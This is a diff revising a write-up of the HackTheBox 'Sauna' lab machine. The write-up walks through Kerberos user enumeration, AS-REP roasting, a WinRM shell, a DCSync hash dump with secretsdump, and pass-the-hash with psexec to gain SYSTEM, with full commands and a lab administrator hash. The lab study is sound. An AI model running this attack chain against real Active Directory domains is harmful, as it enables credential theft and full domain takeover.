@@ -8,11 +8,6 @@ Sauna is a Windows machine rated Easy on HTB.
 `nmap -sC -sV -p- 10.10.10.175`
 
 ```
-Nmap scan report for 10.10.10.175
-Host is up, received echo-reply ttl 127 (0.22s latency).
-Scanned at 2020-03-31 16:41:54 +08 for 687s
-Not shown: 65515 filtered ports
-Reason: 65515 no-responses
 PORT      STATE SERVICE       REASON          VERSION
 53/tcp    open  domain?       syn-ack ttl 127
 | fingerprint-strings:
@@ -42,7 +37,7 @@ PORT      STATE SERVICE       REASON          VERSION
 <SNIP>
 ```
 
-From the scan results, we know that this is probably an Active Directory Domain Controller.
+Looking at the scan results, this is probably an Active Directory Domain Controller.
 
 ## LDAP Recon
 
@@ -82,15 +77,17 @@ If you're new to Keberos, this is an [excellent introduction](https://www.roguel
 
 ### Generating Username List
 
-Username Anarchy is a [nifty tool](https://github.com/urbanadventurer/username-anarchy) you can use to generate a username list.
+Let's store the staff names we have gathered so far into `staffnames.txt`.
 
-`./username-anarchy -i staffnames.txt > usernamelist.txt`
+Next, we can use the staff list to generate possible usernames. [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) is a nifty tool for generating a username list if you're not sure of the naming convention.
+
+`./username-anarchy -i staffnames.txt > usernames.txt`
 
 ### Testing Kerberos Authentication Server Response
 
-As Kerberos replies differently for known and unknown usernames, it's possible to check if a username exists. An [nmap script](https://nmap.org/nsedoc/scripts/krb5-enum-users.html) is available.
+As the Kerberos replies differently for known and unknown usernames, it's possible to check if a username exists. An [nmap script](https://nmap.org/nsedoc/scripts/krb5-enum-users.html) is available.
 
-`nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='EGOTISTICAL-BANK.LOCAL',userdb='usernamelist.txt' 10.10.10.175`
+`nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='EGOTISTICAL-BANK.LOCAL',userdb='usernames.txt' 10.10.10.175`
 
 ```
 PORT   STATE SERVICE
@@ -108,6 +105,8 @@ We have the following Kerberos usernames:
 * fsmith
 * hsmith
 
+Let's store them into `targetusers.txt`.
+
 ## AS-REP Roasting
 
 AS-REP roasting is the process of getting the Authentication Server to reply with information that we can crack for credentials.
@@ -117,19 +116,19 @@ How it works:
 1. User sends a request to the Kerberos Authentication Server (AS).
 2. As pre-authentication is disabled, the AS will reply with a logon session key and a Ticket-Granting Ticket (TGT) **without checking any credentials**. (Hence, AS-REP.)
 3. Both the **logon session key** and the **TGT** are encrypted.
-3. In particular, logon session key is encrypted with a key derived from the **user's password**.
+3. In particular, the logon session key is encrypted with a key derived from the **user's password**.
 4. With the encrypted logon session key, we can crack for the user's password offline.
 
 Conditions:
 
-* Have valid username
+* Have a valid username
 * Pre-Authentication for user is disabled
 
 ### Requesting For Encrypted Ticket From AS
 
 For Linux, [Impacket](https://github.com/SecureAuthCorp/impacket) is the go-to tool for pentesting Kerberos.
 
-`./GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile TargetUsers.txt -format john -outputfile hashes.asreproast`
+`./GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile targetusers.txt -format john -outputfile hashes.asreproast`
 
 ```
 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
@@ -180,7 +179,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\FSmith\Documents> cat C:\Users\FSmith\Desktop\user.txt
 ```
 
-**We get user.**
+We get **user**.
 
 ## Finding The Autologon Password
 
@@ -224,13 +223,13 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
 
 ## DCSync Attack
 
-Many Active Directory (AD) infrastructure has multiple Domain Controllers. To maintain a consistent environment, you need a way to replicate AD objects for each DC. The replication is done through an API (DRSUAPI).
+Many Active Directory (AD) infrastructure has multiple Domain Controllers. To maintain a consistent environment, you need a way to replicate AD objects for each DC. The replication is done through the DRSUAPI API.
 
 In a DCSync attack, we impersonate a Domain Controller to replicate objects.
 
 ### Required Permissions
 
-However, to perform a DCSync attack, the compromised account needs to have the following replication permissions:
+However, to perform a DCSync attack, the compromised account needs to have these replication permissions:
 
 The “DS-Replication-Get-Changes” extended right
 * CN: DS-Replication-Get-Changes
@@ -253,15 +252,17 @@ We have compromised two accounts:
 
 Let's check if any of them has the required permissions for a DCSync attack.
 
-We need the ActiveDirectory module for the following command.
+We need the ActiveDirectory module for the following command, so let's import it.
 
 `Import-Module ActiveDirectory`
 
-In the command below, the part before `|` gets specific access permissions of objects in the stated domain. It returns many results, so the part after `|` filters the output to show only the permissions that we are interested in. (i.e. the permissions that enable a DCsync attack.)
+* In the command below, the part before `|` gets specific access permissions of objects in the stated domain. 
+
+* It returns many results, so the part after `|` filters the output to show only the permissions that we are interested in. (i.e. the permissions that enable a DCsync attack.)
 
 `(Get-ACL "AD:dc=EGOTISTICAL-BANK,dc=LOCAL").access | Where-Object {($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" )}`
 
-The results show that svc_loanmgr has the required permissions.
+The results show that svc_loanmgr has the required permissions, so we can try a DCSync attack.
 
 ```
 <SNIP>
@@ -290,9 +291,11 @@ PropagationFlags      : None
 
 ### Dumping Secrets
 
-We can perform a DCsync attack remotely with Impacket's secretsdump.py.
+We can perform a DCsync attack remotely with Impacket's `secretsdump.py`.
 
 `impacket-secretsdump -just-dc EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175`
+
+With the `-just-dc` flag, it tries to get both the NTLM hashes and Kerberos keys.
 
 ```
 root@kali:~/htb/openadmin# impacket-secretsdump -just-dc EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
@@ -313,7 +316,7 @@ Now that we have the hashes, we can use them to get admin access.
 
 ### Passing The Hash
 
-The SMB port is open so psexec is an option.
+The SMB port is open, so psexec is an option.
 
 `./psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff`
 
@@ -321,12 +324,7 @@ The SMB port is open so psexec is an option.
 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 
 [*] Requesting shares on 10.10.10.175.....
-[*] Found writable share ADMIN$
-[*] Uploading file lITmZIjg.exe
-[*] Opening SVCManager on 10.10.10.175.....
-[*] Creating service JnaQ on 10.10.10.175.....
-[*] Starting service JnaQ.....
-[!] Press help for extra shell commands
+<SNIP>
 Microsoft Windows [Version 10.0.17763.973]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
@@ -334,33 +332,29 @@ C:\Windows\system32>whoami
 nt authority\system
 ```
 
-We are passing the NTLM hashes here. You can also use the Kerberos key. But there more details to pay attention to when you authenticate with Kerberos including time sync and using a FQDN.
+We are passing the NTLM hashes here. 
+
+You can also use the Kerberos key. But there more details to pay attention to when you authenticate with Kerberos including time sync and using a FQDN.
 
 # Ending Thoughts
 
 This was my first Active Directory box. It spurred me to learn a lot more about Active Directory and Kerberos. It is a very educational box for me.
 
-*References*
+**References**
 
-staffname format
-
-ad Permissions
-
-add to pentesting notes
-
-Kerberos and AS-REP Roasting
+*Kerberos and AS-REP Roasting*
 
 * https://www.tarlogic.com/en/blog/how-kerberos-works/
 * https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting
 * https://docs.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets
 * https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
 
-evil-winrm
-https://hacks.biz/evilwinrm-the-ultimate-winrm-shell-for-pentesting/
+*Getting A Shell*
 
-https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/
+* https://hacks.biz/evilwinrm-the-ultimate-winrm-shell-for-pentesting/
+* https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/
 
-DCSync
+*DCSync*
 
 * https://github.com/backlion/Offensive-Security-OSCP-Cheatsheets/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync.md
 * https://pentestlab.blog/tag/dcsync/
